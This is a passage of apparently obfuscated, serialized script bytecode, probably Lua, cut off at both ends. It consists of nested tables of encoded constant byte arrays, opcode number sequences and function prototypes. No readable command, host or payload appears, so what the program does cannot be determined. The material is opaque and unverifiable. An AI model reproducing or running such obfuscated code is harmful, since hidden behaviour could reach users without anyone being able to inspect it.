11,148,15,197,11,143,1,132,0,164,21,136,79,209,81,134,84,138,81,132,83,241,25,147,26,214,138},{81,213,95,218,90,254,83,206},{98,226,106,148,116,245,99,241,111,255},{92,210,89,208},{12}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,6,7,6,6,48,6,1,3,59,15,45,17,4,39,4,39,5,30,15,82,39,4,39,5,44,13,39,7,6,0,6,3,13,39,7,6,2,28,13,6,12,30,6,15,6,15,6,14,69,6,13,39,6,6,9,6,8,69,7,17,4,20,5,41,82,39,4,39,5,49,13,39,7,6,0,6,11,13,39,7,6,2,39,1,13,39,0,6,10,10,59,6,21,39,5,13,59,6,20,28,23,6,22,30,6,17,39,3,39,2,69,6,13,59,6,16,39,2,13,69,7,17,4,39,6,6,19,39,13,39,5,30,59,15,162,17,4,39,13,39,5,30,6,18,30,59,37,15,170,17,4,6,29,69,7,17,4,20,5},P={},U={{1,99},{1,101},{1,94},{1,23},{1,31},{1,13},{1,9},{1,10},{1,100}},nParams=0},{K={7,49,{50,237,122,206,69},{106,254,82,198,71,215,113,204,66},{124,207,69,199},{76,206,65,194,72,133,69,154,79,200,71,206,22,234,75,219,99,212,64,197,93,214,83,159,26,233,86,218,69,216,76,204,98,232,108,143,43,166,39,171,24,165,43,178,41,191,96,140,56,176,32,178,55,161,51,165,120,181,53,184,61,177,126,173,93,130,66,130,10,129,70,132,82,175,3,133,8,171,7,157,3,133,49,155,29,153,18,223,90,177,15,150,29,147,17,150,228,83,237,108,240,85,231,117,252,43,163,43,229,107,174,125,176,101,250,118,250,53,228,57,217,119,249,115,243,111,251,123,157,79,205,87,132,87,136,102,198,74,194,68,222,72,202,15,213,95,214},{64,198,78,205,75,237,66,209},{100,241,97,224,124,226},{119,235,98,225,107,237,109}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,6,7,10,59,6,6,39,5,13,59,6,1,6,0,13,59,6,3,39,7,13,69,7,17,4,39,6,6,2,6,13,69,7,17,4,20,5},P={},U={{1,99},{1,13},{1,10},{1,23}},nParams=0},{K={1,2,{50,237,122,206,69},{106,254,82,198,71,215,113,204,66},{124,207,69,199},{76,206,65,194,72,133,74,215,21,206,75,198,73,151,105,202,68,226,87,193,66,220,85,210,16,155,106,215,93,196,91,205,51,227,107,237,8,170,37,166,36,153,38,170,53,168,60,239,36,176,33,184,122,166,38,182,47,183,114,189,41,179,61,171,9,142,12,203,77,197,17,143,1,133,15,203,24,140,29,132,94,134,19,154,0,221,70,217,73,208,90,159,19,221,18,144,227,96,238,35,236,56,234,119,166,74,226,106,254,108,237,123,245,99,178,114,250,113,182,123,232,55,217,115,253,111,255,124,212,68,208,25,226,76,200,67,238,64,216,88,216,110,198,70,220,85,253,85,247,89,215,68,203,17,152,115,201,80,223,81,175,40,166,97,237,101,175,33,232,33,234,63,164,40,160,111,184,127,154,54,181,57,162,63,229,105,250,62,178,57,254,58,142,5,194,6,138,1,207},{64,198,78,205,75,237,66,209},{110,236,107,245,6,236,97,229,102},{98,231,113,239,113,237}},C={6,5,6,5,16,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,6,7,10,59,6,6,39,5,13,59,6,1,6,0,13,59,6,3,39,7,13,69,7,17,4,39,6,6,2,6,13,69,7,17,4,20,5},P={},U={{1,99},{1,13},{1,10},{1,23}},nParams=0},{K={15,225,100,7,2,12,144,{81,198,80,198,74,206,88,203,69,202,94,201},{83,199,68,202,75},{78,202,68,238,76},{111,233,101,225,109},{82,200,91,221,88,194,66,202}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,39,5,30,52,5,6,7,6,6,19,6,1,3,59,15,41,17,4,51,5,15,102,6,0,6,0,26,6,3,3,59,15,56,17,4,28,2,15,75,28,13,28,2,51,5,6,12,30,69,7,17,4,41,75,31,39,7,6,15,28,14,51,5,6,12,30,62,4,-1,1,4,17,4,41,102,20,5},P={},U={{1,99},{1,100},{1,23}},nParams=0},{K={3,2,9,{49,236,69,207,70},{107,193,83,197,70,208,112,207,67},{67,206,70,198},{126,253,104,237,105,234,115,224,123,239,106,232,126,241,112},{67,199,73,204,72,236,77,208},{104,237,105,234,7,252,97,248,110,237,105,253},{119,224,104,243}},C={6,5,6,4,48,6,7,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,6,6,10,59,6,1,39,5,13,59,6,0,6,3,13,59,6,2,39,7,13,69,7,17,4,39,6,6,13,6,12,69,7,17,4,20,5},P={},U={{1,99},{1,13},{1,10},{1,23}},nParams=0},{K={7,49,{105,241,108,212,83,203,77,195},{121,254,77,196},{79,204,64,193,70,237,65},{106,206,64,234,64},{82,214,81,205,75,193},{68,204,86,200,71,211},{79,203,70,199,75,136,123,239,103,237,116,147,13,149,66,144,19,216,90,213,86,212,25,241,126,229,0,156,26,179,99,200,47,171,38,167,43,232,33,185,118,171,44,163,42,234,22,183,39,135,48,164,33,177,58,191,115,254,21,170,43,144,50,135,17,146,12,133,2,202,64,202,7,131,14,143,3,208,29,130,78,147,20,155,18,194,62,159,15,175,24,140,9,105,226,103,171,38,213,106,230,113,236,120,248,46,164,32,195,127,242,115,255,68,249,119,238,125,235,58,247,115,254,127,243,0,205,81,158,67,196,75,194,18,238,79,223,127,200,92,217,89,210,87,155,22,249,89,208,107,220,72,205,85,222,91,157,105,203,46,172,39,164,42,231,46,188,36,168,56,164,33,161,112,163,122,188,125,245,63,177,120,170,35,181,124,188,48,187,64,146,27,141,74,151,3,150,29,140,25,159,76,153,6,138,30,209,0,150,0,128,4,153,88,138,3,149,82,143,27,142,245,100,241,119,172,106,175,39,237,101,249,110,229,107,174,103,228,101,226,76,230,112,231,98,253,106,238,59,232,117,251,113,128,83,199,87,209,87,200,7,192,93,222,91,243,95,203,94,197,84,193,71,156,90,159,23,221,85,201,94,213,91,158,77,165,48,183,38,183,49,230,51,160,44,164,107,190,40,186,58,162,63,242,33,177,36,163,50,171,45,242,52,245,125,187,49,132,65,135,13,128,111,138,8,139,8,134,75,138,24,128,12,132,24,157,29,212,5,222,7,153,13,146,87,152,84,222,15,99,224,110,239,44,247,42,252,93,251,102,182,94,200,66,206,73,191,60,227,117,225,126,187,85,252,110,243,115,249,35,189,112,238,113,247,6,137,110,194,73,205,79,217,95,144,85,244,18,242,93,221,64,208,88,195,21,237,67,203,89,159,99,130,98,160,50,179,40,172,37,166,60,160,37,165,99,167,61,160,62,243,47,255,22,186,50,174,101,177,41,225,22,142,17,145,37,143,1,140,0,128,78,131,65,148,67,203,9,131,10,229,28,158,17,146,24,213,3,158,28,196,14,148,15,137,12,150,238,102,170,111,244,43,211,116,237,123,195,111,165,7,226,124,190,92,247,96,231,116,241,114,215,108,238,33,223,114,240,113,197,66,214,11,194,80,200,68,220,64,197,69,132,64,221,72,156,92,198,26,190,89,217,84,217,85,154,75,206,88,131,29,176,51,171,45,176,103,204,46,174,105,167,63,241,112,139,33,165,60,252,30,177,38,165,54,191,60,142,34,172,56,240,18,133,18,145,2,131,0,177,6,154,7,131,5,139,77,154,7,149,31,210,3,134,16,203,85,143,24,136,21,222,119,155,19,115,228,107,229,36,232,114,186,53,204,100,254,97,163,67,234,99,226,115,244,113,193,111,231,125,183,87,254,111,238,127,248,69,228,80,209,75,215,6,211,64,204,68,139,92,223,75,146,18,212,64,193,91,199,20,151,93,215,94,177,72,220,77,212,110,178,50,162,51,171,110,183,100,235,101,167,35,170,108,227,43,164,59,183,105,160,63,179,116,183,59,182,57,224,50,175,78,175,3,142,1,201,22,149,13,212,26,153,9,193,3,156,23,204,6,156,7,129,4,158,22,158,82,150,15,154,87,211,225,101,239,106,234,78,227,126,181,66,207,82,241,36,132,106,254,117,187,25,224,116,229,124,182,106,234,122,235,115,182,121,213,79,193,87,205,74,200,15,129,9,221,67,197,65,203,15,196,80,193,88,154,66,215,94,204,17,139,21,137,20,158,91,175,97,178,107,230,106,180,34,175,32,185,63,169,63,236,99,171,36,187,55,233,32,191,51,244,55,187,54,185,96,178,47,206,47,131,14,129,73,150,11,137,10,143,34,136,80,154,0,131,5,128,26,154,18,222,16,153,20,159,85,172,17,159,28,101,200,102,170,40,239,105,229,65,237,55,236,109,224,107,161,90,254,112,218,112,232,63,183,125,247,126,187,121,243,122,182,42,213,67,208,79,139,85,215,73,222,68,131,74,216,64,204,68,216,93,221,28,156,22,192,80,208,86,222,28,201,95,204,43,239,53,162,45,177,110,246,102,252,99,235,40,162,68,163,63,178,51,191,116,186,61,251,42,188,41,230,44,190,63,179,12,201,16,207,31,176,20,139,85,187,47,167,45,180,64,193,82,222,2,156,24,153,89,213,86,215,15,146,24,209,51,154,244,105,237,103,185,39,193,66,220,43,247,34,134,100,232,47,255,122,178,114,250,113,182,101,253,106,186,122,242,121,190,109,197,82,140,97,203,65,223,7,220,65,207,69,166,65,193,76,209,93,146,92,223,7,154,83,133,73,217,90,208,81,150,87,179,111,136,16,139,11,130,34,171,38,174,46,224,37,189,99,162,52,161,125,150,58,178,46,241,83,179,61,252,50,181,109,192,0,140,7,196,1,198,6,134,13,202,31,149,29,139,71,148,95,145,28,144,16,223,74,197,91,137,15,142,20,144,24,34,161,99,237,96,165,37,227,38,234,101,239,105,179,62,175,100,249,119,253,30,249,121,244,121,245,58,253,114,160,114,240,65,197,81,215,86,204,72,192,0,205,4,200,67,201,75,134,16,216,84,147,82,219,22,195,80,220,84,155,72,220,77,212,110,178,50,162,51,171,110,183,43,168,38,167,96,171,32,230,112,180,60,183,94,176,56,179,82,188,52,191,86,184,48,187,64,132,12,135,77,239,22,207,74,198,24,142,11,132,29,155,21,131,80,223,15,128,31,147,69,140,19,159,80,147,31,146,229,60,238,115,170,75,231,106,237,37,250,103,237,110,235,70,244,44,230,124,231,97,228,126,246,126,178,124,253,112,251,49,240,77,195,64,193,108,194,14,132,67,197,73,229,73,147,72,209,92,215,29,254,90,212,126,220,68,147,49},{11,214,67,201,76},{81,199,85,207,76,222,126,197,73},{69,200,76,204},{70,204,68,195,69,231,72,215},{92,200,89,192},{77,207,71,205,84},0.3,{123,249,97,226,15,227,116,252,103},{66,204,67,202},{18}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,28,7,28,6,6,1,30,69,4,52,5,28,7,28,6,6,0,30,69,4,52,4,39,5,52,7,28,3,6,2,30,6,13,39,4,39,7,69,6,52,6,39,6,6,12,10,59,6,15,51,7,13,59,6,14,51,6,13,59,6,9,39,7,13,69,7,17,4,28,8,6,11,30,6,10,54,4,69,7,17,4,39,1,6,21,39,0,51,7,30,59,15,120,17,4,39,0,51,7,30,6,20,30,59,37,15,128,17,4,6,23,69,7,17,4,20,5},P={{K={{52,239,120,240,123},{104,252,108,248,69,213,119,202,64},{126,241,123,197},{109,235,82,200,76,196},{121,207,83,207,66,208},{76,206,65,194,72,133,82,212,21,206,75,198,73,151,105,202,68,226,87,193,66,220,85,210,16,155,110,222,80,216,78,208,50,181,17,166,54,179,47,164,45,235,99,235,32,162,45,174,60,241,62,163,105,178,55,186,61,227,29,190,40,142,59,173,22,136,1,134,76,199,54,139,9,144,15,153,31,207,71,193,60,158,17,146,24,165,26,150,1,156,8,241,21,155,94,140,249,111,162,98,234,97,166,116,241,103,164,127,252,121,174,123,248,116,252,51,228,118,247,123,244,49,233,98,242,51,234,111,212,13,135,80,136,7,131,84,138,0,138,89,201,89,219,93,222,17,215,93,208,63,223,81,152,77,223,87,217,77,209,77,180,97,182,43,161,43,230,55,171,40,166,39,228,57,171,35,181,33,189,33,160,121,243,36,241,121,168,62,168,40,172,49,192,4,140,7,238,12,128,71,144,12,132,4,204,12,128,11,208,9,151,29,155,91,130,18,148,28,138,20,142,9,222,11,104,228,108,163,116,230,103,235,100,161,114,238,98,226,32,251,117,253,119,227,123,231,98,187,61,234,51,187,110,248,106,234,82,207,2,198,74,193,44,215,75,200,70,199,4,203,91,193,83,197,91,220,90,157,31,151,76,202,0,239,89,209,91,207,47,179,54,151,43,149,42,166,43,172,3,165,63,185,47,161,51,180,122,246,39,249,116,242,43,251,118,183,44,244,126,186,14,133,75,233},{64,198,78,205,75,237,66,209}},C={39,5,6,5,10,59,6,4,39,4,13,59,6,7,28,6,6,1,30,6,0,39,7,39,6,39,7,39,7,39,7,39,6,69,2,13,59,6,3,39,1,13,69,7,17,4,20,5},P={},U={{0,3},{1,2},{1,0},{1,1},{0,2}},nParams=0}},U={{1,99},{1,9},{1,10},{1,13},{1,23},{1,100}},nParams=0},{K={1,2,{105,255,108,203},{105,254,73,213}},C={6,5,6,5,16,6,4,3,59,15,19,17,4,28,7,6,6,30,39,5,69,4,15,37,39,4,69,5,17,4,41,5,20,5},P={},U={{1,11},{1,102}},nParams=0},{K={{79,249,101,234}},C={39,5,6,5,39,4,13,20,5},P={},U={{1,106},{1,118}},nParams=0},{K={15,225,0,{121,236,85,195},{67},{124,253},{3},{126,129},{12,215,64,200,67},{80,196,84,192,77,221,127,194,72},{70,201,67,205},{85,211,90,192,68,204},{65,199,91,199,74,216},{68,198,73,202,64,141,65,196,28,210,90,142,68,214,87,219,84,145,92,206,82,222,74,214,47,175,106,234,100,183,35,179,61,187,36,235,43,172,35,170,106,150,55,167,7,176,36,161,49,186,63,243,126,137,59,167,20,162,10,130,16,182,3,149,30,128,9,142,78,196,84,184,17,152,6,181,27,135,53,159,17,149,30,211,94,169,27,135,244,66,234,98,234,107,227,107,251,43,166,62,165,55,217,110,249,101,212,124,230,86,254,126,244,125,178,57,206,95,198,88,197,79,199,81,197,73,132,11,157,0,138,78,194,73,135,37,217,87,146,92,223,21,215,89,220,25,217,83,156,73,214,90,174,97,178,32,165,41,170,111,174,60,164,40,184,36,161,33,248,120,242,48,188,111,133,50,182,61,155,40,165,51,189,119,194,68,145,65,205,69,131,9,140,64,202,14,130,9,228},{72,206,70,197,67,229,74,201},{105,227,109,249,14,252,117,255,102},{127,201,85,218},{}},C={6,5,6,5,26,6,4,3,59,15,22,17,4,51,4,46,6,7,3,15,28,20,5,41,28,51,4,59,6,6,30,68,6,1,6,0,69,6,59,6,6,30,68,6,3,6,2,69,6,52,7,39,5,6,13,10,59,6,12,51,5,13,59,6,15,28,14,6,9,30,6,8,51,7,69,7,13,59,6,11,39,4,13,69,7,17,4,39,7,6,10,6,3,51,4,6,3,5,5,69,7,17,4,39,6,6,21,6,20,13,20,5},P={},U={{1,13},{1,10},{1,23},{1,122}},nParams=2},{K={100,7,2,{80,208,0,245,99,241,99,224,114},{},{116,196,90,215},12,144,0,{11,214,67,201,76},{81,199,85,207,76,222,126,197,73},{69,200,76,204},{70,204,68,195,69,231,72,215},{109,241,111,232,121,249,107,235},{203,44,185,140},{68,202,65,200},{20}},C={6,5,6,4,19,6,7,3,59,15,21,17,4,39,5,37,15,37,39,4,6,6,6,1,69,7,17,4,20,5,41,37,39,7,6,0,30,52,5,6,3,6,3,26,6,2,3,59,15,63,17,4,51,5,46,6,13,3,15,69,20,5,41,69,39,6,6,12,10,59,6,15,39,5,13,59,6,14,51,5,13,59,6,9,39,1,13,69,7,17,4,39,4,6,8,6,11,39,0,39,5,30,59,15,118,17,4,39,0,39,5,30,6,10,30,59,37,15,126,17,4,6,21,5,69,7,17,4,20,5},P={},U={{1,99},{1,23},{1,106},{1,13},{1,10},{1,100}},nParams=0},{K={3,2,9,{80,208,0,245,99,241,99,224,114},{},{116,196,90,215}},C={6,5,6,4,48,6,7,3,59,15,21,17,4,39,5,37,15,37,39,4,6,6,6,1,69,7,17,4,20,5,41,37,39,7,39,5,39,6,6,0,30,69,7,17,4,20,5},P={},U={{1,99},{1,23},{1,124},{1,122}},nParams=0},{K={7,49,{73,251,103,212}},C={6,5,6,5,26,6,4,3,59,15,19,17,4,51,5,59,15,19,17,4,39,5,15,34,39,4,39,5,39,7,6,7,30,69,7,17,4,41,34,20,5},P={},U={{1,99},{1,124},{1,122}},nParams=1},{K={9,{89,243,107,242},{91,241,113,212},{89,240,84,201,67,206,102,202,74,195},{76,201,91,199},{117,229,75,206,22},{79,199,84},1,2,0,14,{118,200,91,192,94,194,67,195}},C={39,5,51,5,51,4,6,5,39,4,28,4,6,7,30,6,6,30,69,0,52,6,51,6,6,1,31,28,0,6,3,30,6,2,39,7,42,6,13,26,6,12,39,6,6,15,62,4,-1,1,4,13,51,6,6,14,28,0,6,3,30,6,12,39,7,6,12,51,7,69,1,13,20,5},P={},U={{1,39},{1,33},{1,60},{1,22}},nParams=3},{K={10,{79,244,100,250},{72,218,118,205,19},{112,250,87},0,200,{113,205,80,205,81,207,72,198}},C={39,5,39,4,51,5,51,4,6,5,69,1,52,0,51,0,6,4,28,7,6,6,30,6,1,51,1,59,37,15,34,17,4,39,7,6,0,69,4,6,1,39,6,69,1,13,51,0,6,3,28,7,6,6,30,6,1,51,7,6,1,51,6,69,1,13,51,0,20,4},P={},U={{1,40},{1,125},{1,22},{1,61}},nParams=5},{K={{79,249,101,234},1,2,0,{48,195,77,203,70,202,81,213,24,201,77,199,66,194,102,203,86,141},15,225,{82,192,69,201,74},{105,247,106,232,99,205,74,197,79,201},100,7,{65,212,93,203},{123},{116,245},{11},{118,137},{88,216,95,199,65,215},{74,194,92,194,81,197},{74,207,66,213,11,245,86,192,102,211,69,206,80,217,94,148,31,237,75,161,51,182,38,182,2,179,46,234,96,240,24,169,57,141,32,162,52,250,113,135,48,184,51,150,54,174,50,186,52,189,62,148,8,141,13,198,73,157,51,129,29,134,14,209,79,175,43,189,56,188,81,216,33,147,15,140,68,216,94,143,95,210,59,117,243,99,247,109,234,104,186,62,244,35},{71,223,81,216,64,192},{0,195,84,220,87},{68,208,64,212,81,193,99,222,92},{68,219,87},{81,220,80,208},{82,208,88,223,89,243,92,195},{118,231,121,246,124,250,123,232,104},{215,48,165,152},{22,212,84,208,95,213,72,206},{}},C={39,5,6,5,30,52,5,6,4,6,4,16,6,7,3,59,15,31,17,4,51,5,46,6,6,3,15,37,20,5,41,37,39,4,6,1,39,7,5,69,4,52,4,6,0,6,0,26,6,3,3,59,15,62,17,4,51,4,37,15,68,20,5,41,68,28,2,39,6,6,13,30,39,6,51,4,62,6,7,52,6,52,7,6,12,6,15,19,6,7,3,59,15,102,17,4,51,7,37,15,108,20,5,41,108,51,5,59,6,14,30,68,6,9,6,8,69,6,59,6,14,30,68,6,11,6,10,69,6,52,1,28,21,6,20,30,6,23,51,1,69,7,52,0,28,22,51,6,62,4,6,52,13,52,2,52,3,35,3,2,13,27,12,27,15,51,3,51,2,51,13,62,7,7,52,15,52,12,51,12,52,13,51,12,12,0,15,217,39,1,6,17,10,59,6,16,51,15,6,19,30,13,59,6,18,51,0,13,59,6,29,39,7,13,69,7,17,4,41,164,39,0,6,28,6,31,51,6,46,6,30,5,5,69,7,17,4,39,5,6,5,6,25,13,20,5},P={},U={{1,129},{1,14},{1,10},{1,1},{1,13},{1,23}},nParams=0},{K={{79,249,101,234},{111,233,108,246,78,198},{123,241,109,205,64,214},{78,243,65,194,71,131,1,214,6,135,98,198,72,139,9,222,204,47,150,187,98,223,85,204,83,197,75,153,31,223,19,152,90,159,96,145,43,173,35,229,99,163,37,186},{107,207,82,214,81,205,75,193},{71,192,79,198},{113,206,66,199,64,239,67},{81,214,70},{105,203,71,239,67},1,20,{97,194,92,249,70,202,85,200,92,220},{106,201,81,250,71,205,84,203,93,195},{69,200,94,195},{79,198,68,195,95},{109,206,88,227,75,219,71,222,64,216,100,220,88,208},1000},C={39,5,6,5,31,28,4,6,7,30,6,6,28,1,28,0,6,3,30,69,4,28,4,6,2,30,28,0,6,13,30,6,12,6,15,69,6,39,4,59,6,14,30,68,69,4,46,39,4,6,9,30,28,8,6,11,30,39,7,59,6,10,30,68,69,4,6,21,26,62,4,-1,1,4,13,20,5},P={},U={{1,132},{1,0},{1,7}},nParams=0},{K={{52,255,113,247,122,206,85,209,28,197,65,203,78,198,98,207,82,145},12,144,{110,252,65,205,78},{85,243,110,236,103,193,70,201,67,205},3,2,9,0,{77,213,71,206,90,218},7,49,{82,193,77},{92,198,89,223,94,196,64,200},{124,217,78,222,100,202},{5,216,73,195,74},{95,205,95,201,74,196,100,219,87},{79,194,74,202},{74,207,66,213,11,245,86,192,102,211,69,206,80,217,94,148,31,238,83,161,56,167,49,183,103,239,105,132,38,169,42,160,29,162,46,169,52,160,105,159,60,181,60,240,123,248,114},{79,203,93,216,92,248,81,204},1,{125,240,97,224,20,254,127,244,115},{17,209,95,221,80,216,67,203}},C={39,5,6,5,39,4,5,69,4,52,5,6,4,6,4,26,6,7,3,59,15,30,17,4,51,5,37,15,36,20,5,41,36,28,6,39,7,6,1,30,39,7,51,5,62,6,7,52,7,52,4,6,0,6,3,48,6,2,3,59,15,70,17,4,51,4,37,15,76,20,5,41,76,6,13,52,6,28,12,51,7,62,4,6,52,3,52,0,52,1,35,1,0,3,27,2,27,13,51,1,51,0,51,3,62,7,7,52,13,52,2,51,2,52,3,51,2,12,0,15,197,6,15,6,15,26,6,14,3,59,15,144,17,4,51,13,6,9,30,28,8,39,6,6,11,30,69,4,0,15,187,39,1,6,10,10,59,6,21,51,13,6,9,30,13,59,6,20,6,23,13,59,6,22,39,4,13,69,7,17,4,51,6,6,17,16,52,6,41,187,41,91,39,0,6,16,51,6,6,19,5,69,7,17,4,20,5},P={},U={{1,14},{1,10},{1,1},{1,7},{1,13},{1,23}},nParams=0},{K={{52,255,113,247,122,206,85,209,28,197,65,203,78,198,98,207,82,145},1,2,{110,252,65,205,78},{85,243,110,236,103,193,70,201,67,205},15,225,0,{74,212,68,207,85,219},100,7,{83,206,76},{83,199,90,222,89,197,67,201},{125,218,79,217,101,201},{6,217,78,194,73},{94,202,94,202,75,219,101,216,86},{72,195,73,203},{91,197,71,195,85,145,70,193,65,208,22,211,87,153,86,212,95,220,82,159,52,252,57,190,100,163,41,181,104,160,119,250,96,252,43,248,112,181,61,243,32,142,63,138,101,162,39,251,57,179,58,255,5,143,6},{76,202,66,217,95,249,86,205},{99,238,99,226,18,240,102,244,101,255},{15,211,93,219,86,218,65,197}},C={39,5,6,5,39,4,5,69,4,52,5,6,4,6,4,16,6,7,3,59,15,30,17,4,51,5,37,15,36,20,5,41,36,28,6,39,7,6,1,30,39,7,51,5,62,6,7,52,7,52,4,6,0,6,0,26,6,3,3,59,15,70,17,4,51,4,37,15,76,20,5,41,76,6,2,52,6,28,13,51,7,62,4,6,52,3,52,0,52,1,35,1,0,3,27,2,27,13,51,1,51,0,51,3,62,7,7,52,13,52,2,51,2,52,3,51,2,12,0,15,197,6,12,6,15,19,6,7,3,59,15,144,17,4,51,13,6,14,30,28,9,39,6,6,8,30,69,4,0,15,187,39,1,6,11,10,59,6,10,51,13,6,14,30,13,59,6,21,6,20,13,59,6,23,39,4,13,69,7,17,4,51,6,6,4,16,52,6,41,187,41,91,39,0,6,22,51,6,6,17,5,69,7,17,4,20,5},P={},U={{1,14},{1,10},{1,1},{1,7},{1,13},{1,23}},nParams=0},{K={{52,255,113,247,122,206,85,209,28,197,65,203,78,198,98,207,82,145},12,144,{110,252,65,205,78},{85,243,110,236,103,193,70,201,67,205},3,2,9,{74,212,68,207,85,219},{11,214,67,201,76},{81,199,85,207,76,222,126,197,73},{83,206,76},{68,199,77,207},{119,246,97,226,96,225,122,231,98,244,115,247,103,234,105},{72,206,70,197,67,229,74,201},{97,226,96,225,14,251,120,227,119,242,112,230},{106,224,97}},C={39,5,6,5,39,4,5,69,4,52,5,6,4,6,4,26,6,7,3,59,15,30,17,4,51,5,37,15,36,20,5,41,36,28,6,39,7,6,1,30,39,7,51,5,62,6,7,52,7,52,4,6,0,6,3,48,6,2,3,59,15,70,17,4,51,4,37,15,76,20,5,41,76,28,13,51,7,62,4,6,52,0,52,1,52,6,35,6,1,0,27,3,27,2,51,6,51,1,51,0,62,7,7,52,2,52,3,51,3,52,0,51,3,12,0,15,144,39,6,6,12,10,59,6,15,51,2,6,14,30,13,59,6,9,6,8,13,59,6,11,39,4,13,69,7,17,4,41,95,39,1,6,10,6,21,69,7,17,4,20,5},P={},U={{1,14},{1,10},{1,1},{1,13},{1,23}},nParams=0},{K={{88,244,124,236,126,195,85,199,81},{90,244,112,251,102,200,80,208,80,230,78,206,68,205,101,205,111,193,79,220,67},{85,235,114,193,79,205,74,192},7,49,{119,192,78,200,119,213,67,194,76},64,16,{97,197,70,205,64,218,70,223,69,200,110,193,67,223,67,129},{112,192,94,211},{118,246,98,237,109,138,100,226},{117,247,109,236,110}},C={39,5,6,5,30,59,15,29,17,4,39,5,6,5,30,59,6,4,30,68,6,7,69,7,52,5,6,6,6,6,26,6,1,3,59,15,47,17,4,51,5,37,15,53,20,5,41,53,39,4,37,40,4,51,5,6,0,39,4,59,15,71,17,4,6,3,59,37,15,79,17,4,6,2,13,39,7,6,13,39,4,59,15,93,17,4,39,6,59,37,15,101,17,4,39,1,13,39,7,6,12,39,4,59,15,107,17,4,6,15,59,37,15,115,17,4,6,14,13,20,5},P={},U={{1,7},{1,143},{1,139},{1,31},{1,27}},nParams=0},{K={1,2,{78,234,122,208,81,199,71},{93,240,78,207,71,192,80},{93,193,66,201,68,214,74,211,73,204,106,197,71,195,95,157},{116,196,90,215},{111,237,96,232,108,246,7,231,103},12,144,{96,204,85,196,71,199,68,206,79,217},{107,233,100,228,96,250}},C={39,5,37,40,5,6,5,6,5,16,6,4,3,59,15,17,17,4,39,5,15,50,39,4,6,7,30,59,6,6,30,68,54,4,62,7,4,40,6,39,1,6,1,39,0,13,39,1,6,0,6,3,13,41,99,6,2,6,2,26,6,13,3,59,15,67,17,4,39,6,15,93,39,6,59,6,12,30,68,69,4,17,4,12,40,6,41,93,39,1,6,1,39,3,13,39,1,6,0,6,15,13,20,5},P={{K={{88,244,124,236,126,195,85,199,81},15,225,{110,254,73,211,81},{88,197,85,230,70,215,70,195,73,204,72,196,95,223},100,7,2,{106,215,100},{102,196,85,194,120,200,88,223},{102,199,73,235,70,198,71,197,73,203}},C={39,5,6,5,30,52,5,6,4,6,4,26,6,7,3,59,15,19,17,4,51,5,15,119,31,28,6,51,5,59,6,1,30,68,62,4,-1,1,6,52,6,52,7,52,4,35,4,7,6,27,1,27,0,51,4,51,7,51,6,62,7,7,52,0,52,1,51,1,52,6,51,1,12,0,15,117,6,0,6,3,19,6,2,3,59,15,97,17,4,51,0,59,6,13,30,68,6,12,69,7,15,107,51,0,6,15,44,13,41,107,41,52,41,119,20,5},P={},U={{0,2}},nParams=0}},U={{1,144},{1,4},{1,7},{1,145},{1,140},{1,31},{1,27}},nParams=0},{K={{81,233,112,238,77,197,80,215,70,215,81},{95,242,112,241,69,194,86},{95,255,124,203,70,208,76,209,75,194,100,199,69,197,89,159},{74,250,88,213},{86,238,103,130,105,241,104,246,7,231,103}},C={39,5,6,5,30,59,6,4,30,68,54,4,69,7,17,4,39,7,6,7,39,6,13,39,7,6,6,6,1,13,20,5},P={{K={{88,244,124,236,126,195,85,199,81},{90,244,112,251,102,200,80,208,80,230,78,206,68,205,101,205,111,193,79,220,67},{85,235,114,193,79,205,74,192},3,2,9,{98,202,66,202,66,195,116,220,72,222,78},{103,205,81,200},{107,209,72,199,73,199,64,206,120,216,76,218,74,228,72,194,86},{110,208,75,215,65,199,77}},C={39,5,6,5,30,59,15,29,17,4,39,5,6,5,30,59,6,4,30,68,6,7,69,7,52,5,6,6,6,1,48,6,0,3,59,15,44,17,4,51,5,15,69,51,5,59,6,3,30,68,28,2,6,13,30,6,12,30,69,7,17,4,41,69,20,5},P={},U={{0,1}},nParams=0}},U={{1,3},{1,7},{1,141},{1,31}},nParams=0},{K={7,49,{110,251,107,195,77,203,83,198,74,199,85,204},{110,252,65,205,78},{107,207,82,214,81,205,75,193},{117,210,71,209,109,193},{116,235,103}},C={6,5,6,5,26,6,4,3,59,15,10,17,4,28,7,15,35,31,28,6,28,7,28,1,39,5,6,0,30,62,4,-1,1,4,17,4,41,35,31,39,4,6,3,28,1,39,5,6,0,30,62,4,-1,1,4,17,4,20,5},P={},U={{1,7},{1,23}},nParams=0},{K={1,2,{120,236,109,207,83},{93,240,76,206,80,144},{121,210,78,207,113,227,103},220,60,15,225,{83,196,84,201},200,160,30,100,7,{73,195,77,217},80,12,144,{71,193,86,222},120,140},C={6,5,6,5,16,6,4,3,59,15,23,17,4,51,5,6,7,3,15,35,28,6,6,1,30,6,0,6,3,6,3,62,6,-1,20,-1,41,173,6,2,6,2,26,6,13,3,59,15,61,17,4,51,5,6,12,3,15,73,28,6,6,1,30,6,15,6,14,6,9,62,6,-1,20,-1,41,173,6,8,6,11,19,6,4,3,59,15,91,17,4,51,5,6,10,3,15,119,28,6,6,1,30,6,21,6,14,6,0,62,6,-1,20,-1,41,173,6,20,6,20,26,6,23,3,59,15,129,17,4,51,5,6,22,3,15,157,28,6,6,1,30,6,17,6,17,6,15,62,6,-1,20,-1,41,173,28,6,6,1,30,6,16,6,15,6,16,62,6,-1,20,-1,20,5},P={},U=nil,nParams=1},{K={{114,236,124,247,109,211},3,2,9,{94,236,109},{70},{119,203,80,205,71,202,66},7,49,{97,247,116},{85,212,66},{67,213,90,198,88},1,{127,232,120,229},{94,203,89,194}},C={28,5,39,5,62,4,6,52,7,52,4,52,5,35,5,4,7,27,6,27,1,51,5,51,4,51,7,62,7,7,52,1,52,6,51,6,52,7,51,6,12,0,15,156,6,4,6,7,48,6,6,3,59,15,59,17,4,39,4,6,1,3,15,78,51,1,6,0,30,6,3,49,13,41,146,6,2,6,2,26,6,13,3,59,15,88,17,4,39,4,6,12,3,15,116,51,1,6,0,30,6,3,51,1,6,15,30,6,14,3,13,41,146,6,9,6,9,16,6,7,3,59,15,134,17,4,39,4,6,8,3,15,146,51,